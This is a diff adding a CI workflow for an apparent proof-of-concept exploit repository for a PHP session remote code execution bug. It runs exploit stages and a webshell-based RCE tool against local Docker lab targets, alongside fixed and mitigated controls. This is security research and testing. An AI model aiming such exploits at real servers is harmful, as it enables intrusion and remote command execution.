@@ -1,0 +1,66 @@
+name: CI
+
+on:
+  push:
+  pull_request:
+
+jobs:
+  unit:
+    name: Offline unit tests
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-python@v5
+        with:
+          python-version: "3.11"
+      - name: Install pytest
+        run: python -m pip install --quiet pytest
+      - name: Run unit tests
+        run: python -m pytest tests/ -q
+
+  e2e:
+    name: End-to-end RCE against the bundled lab
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Start the lab (vulnerable / fixed / mitigated targets)
+        run: docker compose up -d
+      - name: Wait for the targets
+        run: |
+          for i in $(seq 1 30); do
+            curl -sf http://127.0.0.1:8087/ >/dev/null && break
+            sleep 2
+          done
+          curl -sf http://127.0.0.1:8087/
+          curl -sf http://127.0.0.1:8088/
+          curl -sf http://127.0.0.1:8089/
+
+      - name: "Stage 1 - deterministic spliced-session object injection"
+        run: python poc/stage1_splice.py
+
+      - name: "Stage 2 - real interrupted pwrite via cgroup OOM"
+        run: python poc/stage2_oom.py
+
+      - name: "Remote exploit - 100% HTTP RCE (webshell + command)"
+        run: |
+          chmod 777 app
+          ./phpaftershell-poc --target http://127.0.0.1:8087 --command 'id' --attempts 40
+
+      - name: Control - fixed version must not be exploitable (stage 1 semantics)
+        run: python poc/stage1_splice.py 8088 || true
+        # stage1 writes the mixed state directly, so the fixed version still
+        # parses it (that is the parser, not the bug). The real control is
+        # stage2/interruption-based paths, covered by the mitigated target:
+      - name: Control - mitigated target (upload progress off) has no progress record
+        run: |
+          SID=$(python -c 'import uuid;print(uuid.uuid4().hex)')
+          curl -s -m 5 -b "PHPSESSID=$SID" \
+            -F 'PHP_SESSION_UPLOAD_PROGRESS=tok' \
+            -F 'file=@/etc/hostname;filename=c.txt' \
+            --limit-rate 1k http://127.0.0.1:8089/index.php >/dev/null &
+          sleep 2
+          # no sess_* file must have appeared on the mitigated target
+          docker exec phpaftershell-mitigated-1 sh -c \
+            "ls /tmp/sess_$SID 2>/dev/null && exit 1 || exit 0"
